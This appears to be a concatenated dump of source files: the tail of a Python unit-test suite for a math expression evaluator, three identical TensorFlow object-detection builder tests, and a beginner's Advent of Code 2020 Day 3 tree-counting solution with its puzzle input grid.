test_reciprocal_trig_functions(self):\n        \"\"\"\n        Test the reciprocal trig functions provided in calc.py\n\n        which are: sec, csc, cot, arcsec, arccsc, arccot\n        \"\"\"\n        angles = ['-pi/4', 'pi/6', 'pi/5', '5*pi/4', '9*pi/4', '1 + j']\n        sec_values = [1.414, 1.155, 1.236, -1.414, 1.414, 0.498 + 0.591j]\n        csc_values = [-1.414, 2, 1.701, -1.414, 1.414, 0.622 - 0.304j]\n        cot_values = [-1, 1.732, 1.376, 1, 1, 0.218 - 0.868j]\n\n        self.assert_function_values('sec', angles, sec_values)\n        self.assert_function_values('csc', angles, csc_values)\n        self.assert_function_values('cot', angles, cot_values)\n\n        arcsec_inputs = ['1.1547', '1.2361', '2', '-2', '-1.4142', '0.4983+0.5911*j']\n        arcsec_angles = [0.524, 0.628, 1.047, 2.094, 2.356, 1 + 1j]\n        self.assert_function_values('arcsec', arcsec_inputs, arcsec_angles)\n\n        arccsc_inputs = ['-1.1547', '-1.4142', '2', '1.7013', '1.1547', '0.6215-0.3039*j']\n        arccsc_angles = [-1.047, -0.785, 0.524, 0.628, 1.047, 1 + 1j]\n        self.assert_function_values('arccsc', arccsc_inputs, arccsc_angles)\n\n        # Has the same range as arccsc\n        arccot_inputs = ['-0.5774', '-1', '1.7321', '1.3764', '0.5774', '(0.2176-0.868*j)']\n        arccot_angles = arccsc_angles\n        self.assert_function_values('arccot', arccot_inputs, arccot_angles)\n\n    def test_hyperbolic_functions(self):\n        \"\"\"\n        Test the hyperbolic functions\n\n        which are: sinh, cosh, tanh, sech, csch, coth\n        \"\"\"\n        inputs = ['0', '0.5', '1', '2', '1+j']\n        neg_inputs = ['0', '-0.5', '-1', '-2', '-1-j']\n        negate = lambda x: [-k for k in x]\n\n        # sinh is odd\n        sinh_vals = [0, 0.521, 1.175, 3.627, 0.635 + 1.298j]\n        self.assert_function_values('sinh', inputs, sinh_vals)\n        self.assert_function_values('sinh', neg_inputs, negate(sinh_vals))\n\n        # cosh is even - do not negate\n        cosh_vals = [1, 1.128, 1.543, 3.762, 0.834 + 0.989j]\n        self.assert_function_values('cosh', inputs, cosh_vals)\n        self.assert_function_values('cosh', neg_inputs, cosh_vals)\n\n        # tanh is odd\n        tanh_vals = [0, 0.462, 0.762, 0.964, 1.084 + 0.272j]\n        self.assert_function_values('tanh', inputs, tanh_vals)\n        self.assert_function_values('tanh', neg_inputs, negate(tanh_vals))\n\n        # sech is even - do not negate\n        sech_vals = [1, 0.887, 0.648, 0.266, 0.498 - 0.591j]\n        self.assert_function_values('sech', inputs, sech_vals)\n        self.assert_function_values('sech', neg_inputs, sech_vals)\n\n        # the following functions do not have 0 in their domain\n        inputs = inputs[1:]\n        neg_inputs = neg_inputs[1:]\n\n        # csch is odd\n        csch_vals = [1.919, 0.851, 0.276, 0.304 - 0.622j]\n        self.assert_function_values('csch', inputs, csch_vals)\n        self.assert_function_values('csch', neg_inputs, negate(csch_vals))\n\n        # coth is odd\n        coth_vals = [2.164, 1.313, 1.037, 0.868 - 0.218j]\n        self.assert_function_values('coth', inputs, coth_vals)\n        self.assert_function_values('coth', neg_inputs, negate(coth_vals))\n\n    def test_hyperbolic_inverses(self):\n        \"\"\"\n        Test the inverse hyperbolic functions\n\n        which are of the form arc[X]h\n        \"\"\"\n        results = [0, 0.5, 1, 2, 1 + 1j]\n\n        sinh_vals = ['0', '0.5211', '1.1752', '3.6269', '0.635+1.2985*j']\n        self.assert_function_values('arcsinh', sinh_vals, results)\n\n        cosh_vals = ['1', '1.1276', '1.5431', '3.7622', '0.8337+0.9889*j']\n        self.assert_function_values('arccosh', cosh_vals, results)\n\n        tanh_vals = ['0', '0.4621', '0.7616', '0.964', '1.0839+0.2718*j']\n        self.assert_function_values('arctanh', tanh_vals, results)\n\n        sech_vals = ['1.0', '0.8868', '0.6481', '0.2658', '0.4983-0.5911*j']\n        self.assert_function_values('arcsech', sech_vals, results)\n\n        results = results[1:]\n        csch_vals = ['1.919', '0.8509', '0.2757', '0.3039-0.6215*j']\n        self.assert_function_values('arccsch', csch_vals, results)\n\n        coth_vals = ['2.164', '1.313', '1.0373', '0.868-0.2176*j']\n        self.assert_function_values('arccoth', coth_vals, results)\n\n    def test_other_functions(self):\n        \"\"\"\n        Test the non-trig functions provided in calc.py\n\n        Specifically:\n          sqrt, log10, log2, ln, abs,\n          fact, factorial\n        \"\"\"\n\n        # Test sqrt\n        self.assert_function_values(\n            'sqrt',\n            [0, 1, 2, 1024],  # -1\n            [0, 1, 1.414, 32]  # 1j\n        )\n        # sqrt(-1) is NAN not j (!!).\n\n        # Test logs\n        self.assert_function_values(\n            'log10',\n            [0.1, 1, 3.162, 1000000, '1+j'],\n            [-1, 0, 0.5, 6, 0.151 + 0.341j]\n        )\n        self.assert_function_values(\n            'log2',\n            [0.5, 1, 1.414, 1024, '1+j'],\n            [-1, 0, 0.5, 10, 0.5 + 1.133j]\n        )\n        self.assert_function_values(\n            'ln',\n            [0.368, 1, 1.649, 2.718, 42, '1+j'],\n            [-1, 0, 0.5, 1, 3.738, 0.347 + 0.785j]\n        )\n\n        # Test abs\n        self.assert_function_values('abs', [-1, 0, 1, 'j'], [1, 0, 1, 1])\n\n        # Test factorial\n        fact_inputs = [0, 1, 3, 7]\n        fact_values = [1, 1, 6, 5040]\n        self.assert_function_values('fact', fact_inputs, fact_values)\n        self.assert_function_values('factorial', fact_inputs, fact_values)\n\n        self.assertRaises(ValueError, calc.evaluator, {}, {}, \"fact(-1)\")\n        self.assertRaises(ValueError, calc.evaluator, {}, {}, \"fact(0.5)\")\n        self.assertRaises(ValueError, calc.evaluator, {}, {}, \"factorial(-1)\")\n        self.assertRaises(ValueError, calc.evaluator, {}, {}, \"factorial(0.5)\")\n\n    def test_constants(self):\n        \"\"\"\n        Test the default constants provided in calc.py\n\n        which are: j (complex number), e, pi, k, c, T, q\n        \"\"\"\n\n        # Of the form ('expr', python value, tolerance (or None for exact))\n        default_variables = [\n            ('i', 1j, None),\n            ('j', 1j, None),\n            ('e', 2.7183, 1e-4),\n            ('pi', 3.1416, 1e-4),\n            ('k', 1.3806488e-23, 1e-26),  # Boltzmann constant (Joules/Kelvin)\n            ('c', 2.998e8, 1e5),  # Light Speed in (m/s)\n            ('T', 298.15, 0.01),  # Typical room temperature (Kelvin)\n            ('q', 1.602176565e-19, 1e-22)  # Fund. Charge (Coulombs)\n        ]\n        for (variable, value, tolerance) in default_variables:\n            fail_msg = \"Failed on constant '{0}', not within bounds\".format(\n                variable\n            )\n            result = calc.evaluator({}, {}, variable)\n            if tolerance is None:\n                self.assertEqual(value, result, msg=fail_msg)\n            else:\n                self.assertAlmostEqual(\n                    value, result,\n                    delta=tolerance, msg=fail_msg\n                )\n\n    def test_complex_expression(self):\n        \"\"\"\n        Calculate combinations of operators and default functions\n        \"\"\"\n\n        self.assertAlmostEqual(\n            calc.evaluator({}, {}, \"(2^2+1.0)/sqrt(5e0)*5-1\"),\n            10.180,\n            delta=1e-3\n        )\n        self.assertAlmostEqual(\n            calc.evaluator({}, {}, \"1+1/(1+1/(1+1/(1+1)))\"),\n            1.6,\n            delta=1e-3\n        )\n        self.assertAlmostEqual(\n            calc.evaluator({}, {}, \"10||sin(7+5)\"),\n            -0.567, delta=0.01\n        )\n        self.assertAlmostEqual(\n            calc.evaluator({}, {}, \"sin(e)\"),\n            0.41, delta=0.01\n        )\n        self.assertAlmostEqual(\n            calc.evaluator({}, {}, \"k*T/q\"),\n            0.025, delta=1e-3\n        )\n        self.assertAlmostEqual(\n            calc.evaluator({}, {}, \"e^(j*pi)\"),\n            -1, delta=1e-5\n        )\n\n    def test_explicit_sci_notation(self):\n        \"\"\"\n        Expressions like 1.6*10^-3 (not 1.6e-3) it should evaluate.\n        \"\"\"\n        self.assertEqual(\n            calc.evaluator({}, {}, \"-1.6*10^-3\"),\n            -0.0016\n        )\n        self.assertEqual(\n            calc.evaluator({}, {}, \"-1.6*10^(-3)\"),\n            -0.0016\n        )\n\n        self.assertEqual(\n            calc.evaluator({}, {}, \"-1.6*10^3\"),\n            -1600\n        )\n        self.assertEqual(\n            calc.evaluator({}, {}, \"-1.6*10^(3)\"),\n            -1600\n        )\n\n    def test_simple_vars(self):\n        \"\"\"\n        Substitution of variables into simple equations\n        \"\"\"\n        variables = {'x': 9.72, 'y': 7.91, 'loooooong': 6.4}\n\n        # Should not change value of constant\n        # even with different numbers of variables...\n        self.assertEqual(calc.evaluator({'x': 9.72}, {}, '13'), 13)\n        self.assertEqual(calc.evaluator({'x': 9.72, 'y': 7.91}, {}, '13'), 13)\n        self.assertEqual(calc.evaluator(variables, {}, '13'), 13)\n\n        # Easy evaluation\n        self.assertEqual(calc.evaluator(variables, {}, 'x'), 9.72)\n        self.assertEqual(calc.evaluator(variables, {}, 'y'), 7.91)\n        self.assertEqual(calc.evaluator(variables, {}, 'loooooong'), 6.4)\n\n        # Test a simple equation\n        self.assertAlmostEqual(\n            calc.evaluator(variables, {}, '3*x-y'),\n            21.25, delta=0.01  # = 3 * 9.72 - 7.91\n        )\n        self.assertAlmostEqual(\n            calc.evaluator(variables, {}, 'x*y'),\n            76.89, delta=0.01\n        )\n\n        self.assertEqual(calc.evaluator({'x': 9.72, 'y': 7.91}, {}, \"13\"), 13)\n        self.assertEqual(calc.evaluator(variables, {}, \"13\"), 13)\n        self.assertEqual(\n            calc.evaluator(\n                {'a': 2.2997471478310274, 'k': 9, 'm': 8, 'x': 0.6600949841121},\n                {}, \"5\"\n            ),\n            5\n        )\n\n    def test_variable_case_sensitivity(self):\n        \"\"\"\n        Test the case sensitivity flag and corresponding behavior\n        \"\"\"\n        self.assertEqual(\n            calc.evaluator({'R1': 2.0, 'R3': 4.0}, {}, \"r1*r3\"),\n            8.0\n        )\n\n        variables = {'t': 1.0}\n        self.assertEqual(calc.evaluator(variables, {}, \"t\"), 1.0)\n        self.assertEqual(calc.evaluator(variables, {}, \"T\"), 1.0)\n        self.assertEqual(\n            calc.evaluator(variables, {}, \"t\", case_sensitive=True),\n            1.0\n        )\n        # Recall 'T' is a default constant, with value 298.15\n        self.assertAlmostEqual(\n            calc.evaluator(variables, {}, \"T\", case_sensitive=True),\n            298, delta=0.2\n        )\n\n    def test_simple_funcs(self):\n        \"\"\"\n        Subsitution of custom functions\n        \"\"\"\n        variables = {'x': 4.712}\n        functions = {'id': lambda x: x}\n        self.assertEqual(calc.evaluator({}, functions, 'id(2.81)'), 2.81)\n        self.assertEqual(calc.evaluator({}, functions, 'id(2.81)'), 2.81)\n        self.assertEqual(calc.evaluator(variables, functions, 'id(x)'), 4.712)\n\n        functions.update({'f': numpy.sin})\n        self.assertAlmostEqual(\n            calc.evaluator(variables, functions, 'f(x)'),\n            -1, delta=1e-3\n        )\n\n    def test_function_case_insensitive(self):\n        \"\"\"\n        Test case insensitive evaluation\n\n        Normal functions with some capitals should be fine\n        \"\"\"\n        self.assertAlmostEqual(\n            -0.28,\n            calc.evaluator({}, {}, 'SiN(6)', case_sensitive=False),\n            delta=1e-3\n        )\n\n    def test_function_case_sensitive(self):\n        \"\"\"\n        Test case sensitive evaluation\n\n        Incorrectly capitilized should fail\n        Also, it should pick the correct version of a function.\n        \"\"\"\n        with self.assertRaisesRegexp(calc.UndefinedVariable, 'SiN'):\n            calc.evaluator({}, {}, 'SiN(6)', case_sensitive=True)\n\n        # With case sensitive turned on, it should pick the right function\n        functions = {'f': lambda x: x, 'F': lambda x: x + 1}\n        self.assertEqual(\n            6, calc.evaluator({}, functions, 'f(6)', case_sensitive=True)\n        )\n        self.assertEqual(\n            7, calc.evaluator({}, functions, 'F(6)', case_sensitive=True)\n        )\n\n    def test_undefined_vars(self):\n        \"\"\"\n        Check to see if the evaluator catches undefined variables\n        \"\"\"\n        variables = {'R1': 2.0, 'R3': 4.0}\n\n        with self.assertRaisesRegexp(calc.UndefinedVariable, 'QWSEKO'):\n            calc.evaluator({}, {}, \"5+7*QWSEKO\")\n        with self.assertRaisesRegexp(calc.UndefinedVariable, 'r2'):\n            calc.evaluator({'r1': 5}, {}, \"r1+r2\")\n        with self.assertRaisesRegexp(calc.UndefinedVariable, 'r1 r3'):\n            calc.evaluator(variables, {}, \"r1*r3\", case_sensitive=True)\n", "447": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "448": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "449": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "450": "# DAY 3 of ADVENT-OF-CODE 2020\n# In todays task we have to count trees from a list that is 31 digits long (g) and has 323 rows (i).\n# The important thing is that the 31 digits show us the universal pattern of that row.\n# Everytime I went out of range I reset (g) to an indexnumber that is not out of range. \n# \n#       in range                  out of range, gets reset\n#          v                          v\n#     __________> g      __________> g\n#    |                  |\n#    |                  |\n#    |                  |\n#    v                  v\n#    i                  i\n\n# CODE STARTS HERE:\n\n### global file-opener ###\n\nfile = open(\"list\", \"r\")\nlist = file.read().split(\"\\n\")\n\nclass Calc:\n\n    g = 0\n    \n# We have to count every \"#\" that is g+3 and i+1 from out last position\n# If g is out of range we set it back to the right position with the Calc.g_counter() function\n#\n    def count_3_1():\n        c_t = 0\n        Calc.g = 0\n        for i in range(len(list)):\n            Calc.g = Calc.g + 3\n            Calc.g_counter()\n            i = i + 1\n            if i == 323: # important because the for loop will go out of range without!\n                break\n            if list[i][Calc.g] == \"#\":\n                c_t += 1\n        return c_t\n\n# We have to count every \"#\" that is g+1 and i+1 from out last position\n# If g is out of range we set it back to the right position with the Calc.g_counter() function\n#\n    def count_1_1():\n        c_t = 0\n        Calc.g = 0\n        for i in range(len(list)):\n            Calc.g = Calc.g + 1\n            Calc.g_counter()\n            i = i + 1\n            if i == 323: # important because the for loop will go out of range without!\n                break\n            if list[i][Calc.g] == \"#\":\n                c_t += 1\n        return c_t\n\n# We have to count every \"#\" that is g+5 and i+1 from out last position\n# If g is out of range we set it back to the right position with the Calc.g_counter() function\n#\n    def count_5_1():\n        c_t = 0\n        Calc.g = 0\n        for i in range(len(list)):\n            Calc.g = Calc.g + 5\n            Calc.g_counter()\n            i = i + 1\n            if i == 323: # important because the for loop will go out of range without!\n                break\n            if list[i][Calc.g] == \"#\":\n                c_t += 1\n        return c_t\n\n# We have to count every \"#\" that is g+7 and i+1 from out last position\n# If g is out of range we set it back to the right position with the Calc.g_counter() function\n#\n    def count_7_1():\n        c_t = 0\n        Calc.g = 0\n        for i in range(len(list)):\n            Calc.g = Calc.g + 7\n            Calc.g_counter()\n            i = i + 1\n            if i == 323: # important because the for loop will go out of range without!\n                break\n            if list[i][Calc.g] == \"#\":\n                c_t += 1\n        return c_t\n\n# We have to count every \"#\" that is g+1 and i+2 from out last position\n# If g is out of range we set it back to the right position with the Calc.g_counter() function\n#\n    def count_1_2():\n        c_t = 0\n        Calc.g = 0\n        for i in range(len(list)):\n            Calc.g = Calc.g + 1\n            Calc.g_counter()\n            i = i + 2\n            if i >= 322: # important because the for loop will go out of range without!\n                break\n            if list[i][Calc.g] == \"#\":\n                c_t += 1\n        return c_t\n\n# Task: multiply all functions\n#\n    def multiplier():\n        result = Calc.count_1_1() * Calc.count_1_2() * Calc.count_3_1() * Calc.count_7_1() * Calc.count_5_1()\n        return result\n    \n# g out of range checker\n# we check if Calc.g is out of range and set it to the right position.\n#\n    def g_counter():\n            if Calc.g == 31:\n                Calc.g = 0\n            elif Calc.g == 32:\n                Calc.g = 1\n            elif Calc.g == 33:\n                Calc.g = 2\n            elif Calc.g == 34:\n                Calc.g = 3\n            elif Calc.g == 35:\n                Calc.g = 4\n            elif Calc.g == 36:\n                Calc.g = 5\n            elif Calc.g == 37:\n                Calc.g = 6\n            elif Calc.g == 38:\n                Calc.g = 7\n\n            \n# Main function that calls all our functions           \n#\nif __name__ == \"__main__\":\n    print(\"Star 1: \", Calc.count_3_1())\n    print(\"Star 2: \", Calc.multiplier())\n\n\n\n\n\n\n# MY LIST OF TODAY:\n\"\"\"\n.#..............##....#.#.####.\n##..........#.....##...........\n.......#....##...........#.#...\n.........#.#...#..........#....\n.........#..#................##\n..#...#..#..#...........#......\n...................#...##..##..\n........#.....##...#.#.#...#...\n#..#.##......#.#..#..........#.\n......#.#...#.#...#........##.#\n.....#.####........#...........\n...###..#............#.........\n.....#.......##......#...#.....\n#......##......................\n......#..............#.........\n..##...#....###.##.............\n#...#..........#.#.........#...\n...........#........#...#......\n.....##.........#......#..#....\n#..............#....#.....#....\n.#......#....#...#............#\n.####..........##..#.#.........\n....#...#......................\n....................#....#.#...\n..........###.#...............#\n.#...........#...##............\n.#.#..#.....#...#....#.......#.\n.##........#..#....#...........\n.........#.....#......###......\n..............#..#.......#.....\n........#..#.#...........#..#..\n#.........#......#.....##.#.#..\n........#.#.#....#.............\n........#........#.#.##........\n#......#.#..........#..#.......\n..#....#...##......###..#..#...\n............#..#.#.........#...\n....#.#...........#..........##\n.......#.#.#..#......#...#.....\n..#.........##.#.........#...#.\n......#....#.#....#........#.#.\n.#....###....#..............#..\n.#....#.......#....#..#.....#..\n.....#.....#...................\n..#.....#......#......#........\n......##.##...#...#...#...#.##.\n##...#....#...#..#...#...#.....\n..#.....#...#...##.##...#......\n.....#.............##...#......\n.....................#.##..#...\n#...#....#....#........#.....#.\n..#...#.........#...#..#.....#.\n#.#......#...................#.\n..#...........##...............\n..#....#........#..#...........\n...........#...................\n.............###......#....#...\n...........#...#....#..#....#..\n.....##............#.#.......#.\n.....#..#....#...#....#........\n...............##........#.#...\n.........#...#.#....#.......#..\n#..#.......#.......#...#.......\n..#...........................#\n......#.......#..#......#......\n.#.......#..................##.\n..#.........#..#.##.#....#...##\n...#..#....#...#....#.#........\n.#...#........##..#..#.......#.\n.....#........#....#....#..#...\n............#...........#......\n..###.......#..#....#......#...\n.....#...#.......#..#..........\n..#........##.#....##..........\n#....#.............#..##......#\n....#.................##.......\n...#.......#........#....##.#.#\n##..##..#.....#.....#..........\n...#...............#....#..#...\n.#...##....#....#.....#....##..\n...#.....#......#......#.......\n#.....#.......##.....#..#....##\n.....#.#...##.#......##....#.#.\n..........#....#.#...#.........\n.#..##...#.....................\n...........##..#...#....#......\n...#......#........#.......#...\n.#......#..#........#.....#..#.\n.......#........##..#.##....#..\n.##..........#..#...#.....#....\n.....##...............#.#......\n..##.....#..#......#..##.#.#...\n....#......#.##...........#....\n#.#..#.......#......#.#........\n...#.#..#....#............#..#.\n...#..........###....#....#...#\n........##...#.......#..#....#.\n..#...#.....#..#........##.....\n...#..#.##.#.#.##..............\n.......#...#.........#.....#..#\n..#.....#.#..........#..#......\n......#..........#......#.....#\n.#...........#........#......##\n..##............#......#...#..#\n#..................#...........\n#....#..#.........#........#..#\n..#.#....###..#...#...##...##..\n...#....#..#.....#.............\n.#........##.##...#....#...#...\n.........#.......##.#.....##...\n#.#.....##...#........#...#...#\n.....#.#.##...#.....#.##..#....\n........#...##...#...#.#..#..#.\n.##....#.##...#.......#........\n...#..#................#..#....\n....#.......#......#...#.##....\n#......###..#...#......#.......\n..#...#...##...........##......\n.......#...#..##....##......#..\n....#.#.............#.#...##..#\n..........#........#...#......#\n............#.#.#....###.......\n#..#...#.#.####...#..#...#.....\n.##.......#.##...#.............\n#..#...........#.#.##.......#..\n...#..#.#...#...###..#.#..#.#..\n..#...#.....#..#....#....#.....\n.........##.......#............\n.........##.##......###........\n.............#.#....#..#.....#.\n...#....#.#.......#......##....\n............#..................\n....##...#..........#...#..#...\n#..#....#.....#.......#.##.#..#\n.....#.........##.............#\n#.....#.#...#............##..##\n..............#....#.....#.....\n.#....###..#.#.....###.#..#....\n.....#....##...#....#......#...\n..........#...#....#...........\n............#....#..#.........#\n..##.....#.#...#.......#...#...\n...#...#..#......##...#.....##.\n......#.##............##.#....#\n....#......#...##.....#.....###\n.#.###...............#...#.#...\n..#....................##...#..\n.......#.....##...........#....\n#.........#....#....#....#....#\n..#.#..##.#.#..................\n.....#.......#................#\n...........#.......#........#..\n#...#.........#.#.....#.....#..\n..........#..#...........#.....\n#..#.##..##..#.#.##.........#..\n#..#..#....##..#.........#.....\n#.#.......................#.#..\n.##......#.#...#......#....#...\n..#.#................#..##.....\n.......#..................#...#\n.....#.........##.#....#.......\n#..........#..#.#..........#..#\n..#..#.....#.........#...#.....\n..............#.....#..#...#.##\n...............................\n...#............##......#.....#\n.......#..#.............#.#....\n...........#..........#........\n...#.####..#......#...#....#...\n##......#.##.....#.............\n....#.........#...#...........#\n...#........#.......#.#..#.#.#.\n..#.......#.........#....#.....\n................#.#.#.##...#..#\n#.##...#...#..#.....#.....#..#.\n...............#...........#...\n.....##.#...............##...#.\n.#..##.##......................\n.......#.........#..#..#.......\n...#......#..................#.\n...#.#..#....#....#............\n...........#...#..#....##......\n.....#...#..#.#....#....#....#.\n.......#...#...#.#.#...........\n....#......#......#...##..#....\n##...#.#.....#..#.##...........\n#.#..#.....#..#................\n...#..#.#......#.#...........##\n##....#...#.....###..#...#....#\n...#.....#.#.#......##...#...#.\n............#.......#..........\n....#..........###.......#.....\n.................##..##....#...\n...........#........##..#......\n...#.#...#.....#........#...#..\n#...#.#......#.#...........#...\n..#..........#....#..........#.\n..#................#...........\n#...#.#....#.#.......#.........\n.#...........##..#....#....#..#\n.##........#.....#...#..#....#.\n......#......#...#.............\n.......#..#...#.##....#..#.#...\n.......#......#....#....#.#.#..\n..........##.....#....##.#.....\n.........##..#...#.....#..#....\n...#....#..........#..#...#..#.\n.......#.....##.#..#.....#...#.\n#...#......#......#...#........\n#..#....#.#......#......#......\n.......#.##....................\n...##...#.....#......##......#.\n.#...................###.......\n....#........###...#........#..\n...#............#.....#..#.....\n..................#......#....#\n..##......#..##..##......#.#...\n........##....##.......#...#...\n.#.#....#.....#.....#....#....#\n...##.#.............#....##....\n.........#.....#...#......#....\n..#.....#............#....##...\n..##.....#.....##.##...........\n#....#.#.......#..#......#.....\n##.......#.....#.....####....#.\n##...#.......#...#.....#.......\n#.....#..##.##...##..#.....#..#\n..........#......#..#.#........\n..##.#......#..............#...\n.#...#..........#.......#....#.\n..#....##...#...........#....#.\n..#.........#..#......#......#.\n.##....#......#.#.........#..##\n.......#...#....##............#\n.##.................#.#........\n...#.#...#..#..#.....#.#.......\n.#.#.......#...................\n..#..#.....#......#.....##..##.\n.#........#.##......#..........\n....##...#............#.#....#.\n.......#.#..#....##.#....#....#\n......####...#..#.....#........\n..........#..#.........#.#..#.#\n..........##.........#.##......\n.##..#.#.....#.....#....#......\n............#..#...............\n.....##.........#...#...##...##\n........#.##.#...#.....#....#.#\n#......##.#.##..........##.....\n#..#..#........#.........#..#..\n...............#.#..##.........\n.#.......##.#..#....#...#....##\n.#..##.....##......#....#...#.#\n........#...#.........#.....#.#\n...........#............#...#..\n................#...........#..\n..............##........#....#.\n..........#.....##.....#..#....\n#......#....###..#..#..........\n.....#.#.....##....#.#.......#.\n...#...#...............#.#.....\n.............#.......#.........\n.....#.....#..#......#.....#...\n.........#.................#.##\n.#.....#.##..#.................\n..#......#.......#.....#...#..#\n..#..#.#.#...#.......#.##......\n..........#..#.........#.......\n.#..........#...#....#..#...##.\n